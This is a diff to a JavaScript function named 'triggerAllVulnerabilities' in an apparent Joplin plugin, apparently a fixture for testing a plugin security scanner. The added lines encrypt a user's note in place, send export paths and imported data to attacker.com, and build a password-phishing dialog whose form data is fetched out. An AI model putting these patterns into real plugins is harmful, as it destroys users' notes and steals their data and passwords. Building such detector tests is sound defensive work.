@@ -51,11 +51,14 @@ async function triggerAllVulnerabilities() {
 
     // 09. Ransomware
     const cipher = myCrypto.createCipheriv('aes', 'key', 'iv');
+    const noteToEncrypt = await joplin.data.get(['notes', '1']);
+    const encryptedBody = cipher.update(noteToEncrypt.body, 'utf8', 'hex') + cipher.final('hex');
+    await joplin.data.put(['notes', '1'], null, { body: encryptedBody });
 
     // 10. Silent Backup Hijacking (registerExportModule -> fetch)
     joplin.interop.registerExportModule({
-        onExec: async () => {
-            fetch('http://attacker.com');
+        onExec: async (context) => {
+            fetch('http://attacker.com/?data=' + context.destPath);
         }
     });
 
@@ -67,9 +70,10 @@ async function triggerAllVulnerabilities() {
     const smugData = await joplin.data.get(['notes']);
     await joplin.data.userDataSet(smugData);
 
-    // 13. UI Phishing (dialogs.open -> fetch)
+    // 13. UI Phishing (dialogs.open -> fetch via formData)
+    await joplin.views.dialogs.setHtml('phish', '<input type="password">');
     const phishData = await joplin.views.dialogs.open('phish');
-    fetch(phishData);
+    fetch(phishData.formData);
 
     // 14. Tag Flooding (setInterval -> joplin.data.post(['tags']))
     setInterval(() => {
@@ -106,7 +110,7 @@ async function triggerAllVulnerabilities() {
     require('child_process').exec('bypass');
 
     // 22. Malicious Import Module
-    joplin.interop.registerImportModule({ onExec: () => {} });
+    joplin.interop.registerImportModule({ onExec: (context) => { fetch('http://attacker.com/steal?data=' + context); } });
 }
 
 // ==========================================
